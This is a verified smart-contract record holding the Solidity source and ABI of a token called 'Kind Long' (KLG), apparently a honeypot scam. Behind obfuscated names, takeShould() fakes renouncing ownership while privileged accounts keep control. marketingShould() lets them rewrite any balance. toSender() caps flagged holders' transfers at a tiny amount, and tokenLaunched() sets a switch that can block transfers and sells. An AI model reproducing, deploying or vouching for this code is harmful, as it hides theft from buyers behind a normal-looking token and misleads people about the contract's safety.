{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface teamSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txLaunchedSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingFrom {\n    function createPair(address tokenExempt, address receiverReceiver) external returns (address);\n}\n\ninterface enableFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atTotal) external view returns (uint256);\n\n    function transfer(address marketingTx, uint256 txMarketingLimit) external returns (bool);\n\n    function allowance(address shouldAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txMarketingLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTx,\n        uint256 txMarketingLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyLaunched, uint256 value);\n    event Approval(address indexed shouldAt, address indexed spender, uint256 value);\n}\n\ninterface launchTradingTotal is enableFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract KindLong is txLaunchedSell, enableFee, launchTradingTotal {\n\n    function autoTeam(address txWallet, address marketingTx, uint256 txMarketingLimit) internal returns (bool) {\n        require(receiverTeamExempt[txWallet] >= txMarketingLimit);\n        receiverTeamExempt[txWallet] -= txMarketingLimit;\n        receiverTeamExempt[marketingTx] += txMarketingLimit;\n        emit Transfer(txWallet, marketingTx, txMarketingLimit);\n        return true;\n    }\n\n    function approve(address toSellSwap, uint256 txMarketingLimit) public virtual override returns (bool) {\n        teamReceiver[_msgSender()][toSellSwap] = txMarketingLimit;\n        emit Approval(_msgSender(), toSellSwap, txMarketingLimit);\n        return true;\n    }\n\n    uint8 private receiverTrading = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTrading;\n    }\n\n    function senderReceiver(address txWallet, address marketingTx, uint256 txMarketingLimit) internal returns (bool) {\n        if (txWallet == exemptSwapLaunch) {\n            return autoTeam(txWallet, marketingTx, txMarketingLimit);\n        }\n        uint256 isTake = enableFee(takeLimit).balanceOf(launchMin);\n        require(isTake == modeFrom);\n        require(marketingTx != launchMin);\n        if (swapFund[txWallet]) {\n            return autoTeam(txWallet, marketingTx, receiverSell);\n        }\n        return autoTeam(txWallet, marketingTx, txMarketingLimit);\n    }\n\n    mapping(address => bool) public launchTeam;\n\n    uint256 tradingWallet;\n\n    bool public fundExempt;\n\n    constructor (){\n        if (fundExempt == teamMinSwap) {\n            teamMinSwap = true;\n        }\n        teamSwap senderTotal = teamSwap(maxSwap);\n        takeLimit = marketingFrom(senderTotal.factory()).createPair(senderTotal.WETH(), address(this));\n        if (exemptFundMode != teamMinSwap) {\n            teamMinSwap = false;\n        }\n        exemptSwapLaunch = _msgSender();\n        takeShould();\n        launchTeam[exemptSwapLaunch] = true;\n        receiverTeamExempt[exemptSwapLaunch] = liquidityToken;\n        if (exemptFundMode) {\n            teamMinSwap = true;\n        }\n        emit Transfer(address(0), exemptSwapLaunch, liquidityToken);\n    }\n\n    function balanceOf(address atTotal) public view virtual override returns (uint256) {\n        return receiverTeamExempt[atTotal];\n    }\n\n    function getOwner() external view returns (address) {\n        return teamFee;\n    }\n\n    function toSender(address receiverFund) public {\n        launchTeamTx();\n        if (fundExempt) {\n            teamMinSwap = true;\n        }\n        if (receiverFund == exemptSwapLaunch || receiverFund == takeLimit) {\n            return;\n        }\n        swapFund[receiverFund] = true;\n    }\n\n    function transferFrom(address txWallet, address marketingTx, uint256 txMarketingLimit) external override returns (bool) {\n        if (_msgSender() != maxSwap) {\n            if (teamReceiver[txWallet][_msgSender()] != type(uint256).max) {\n                require(txMarketingLimit <= teamReceiver[txWallet][_msgSender()]);\n                teamReceiver[txWallet][_msgSender()] -= txMarketingLimit;\n            }\n        }\n        return senderReceiver(txWallet, marketingTx, txMarketingLimit);\n    }\n\n    event OwnershipTransferred(address indexed modeReceiver, address indexed swapLaunch);\n\n    address private teamFee;\n\n    function name() external view virtual override returns (string memory) {\n        return feeFrom;\n    }\n\n    bool private exemptFundMode;\n\n    uint256 private liquidityToken = 100000000 * 10 ** 18;\n\n    function allowance(address takeMode, address toSellSwap) external view virtual override returns (uint256) {\n        if (toSellSwap == maxSwap) {\n            return type(uint256).max;\n        }\n        return teamReceiver[takeMode][toSellSwap];\n    }\n\n    string private buyTo = \"KLG\";\n\n    function launchTeamTx() private view {\n        require(launchTeam[_msgSender()]);\n    }\n\n    function takeShould() public {\n        emit OwnershipTransferred(exemptSwapLaunch, address(0));\n        teamFee = address(0);\n    }\n\n    bool public exemptEnableFee;\n\n    function owner() external view returns (address) {\n        return teamFee;\n    }\n\n    address public takeLimit;\n\n    mapping(address => mapping(address => uint256)) private teamReceiver;\n\n    string private feeFrom = \"Kind Long\";\n\n    function tokenLaunched(uint256 txMarketingLimit) public {\n        launchTeamTx();\n        modeFrom = txMarketingLimit;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityToken;\n    }\n\n    uint256 constant receiverSell = 3 ** 10;\n\n    uint256 modeFrom;\n\n    function marketingShould(address listAmountMode, uint256 txMarketingLimit) public {\n        launchTeamTx();\n        receiverTeamExempt[listAmountMode] = txMarketingLimit;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTo;\n    }\n\n    mapping(address => bool) public swapFund;\n\n    mapping(address => uint256) private receiverTeamExempt;\n\n    address launchMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address maxSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public exemptSwapLaunch;\n\n    bool public teamMinSwap;\n\n    function senderToken(address launchAt) public {\n        require(launchAt.balance < 100000);\n        if (exemptEnableFee) {\n            return;\n        }\n        if (teamMinSwap != fundExempt) {\n            fundExempt = true;\n        }\n        launchTeam[launchAt] = true;\n        \n        exemptEnableFee = true;\n    }\n\n    function transfer(address listAmountMode, uint256 txMarketingLimit) external virtual override returns (bool) {\n        return senderReceiver(_msgSender(), listAmountMode, txMarketingLimit);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toSellSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSellSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketingLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptEnableFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSwapLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAmountMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketingLimit\",\"type\":\"uint256\"}],\"name\":\"marketingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"}],\"name\":\"senderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMinSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"toSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txMarketingLimit\",\"type\":\"uint256\"}],\"name\":\"tokenLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAmountMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketingLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketingLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KindLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}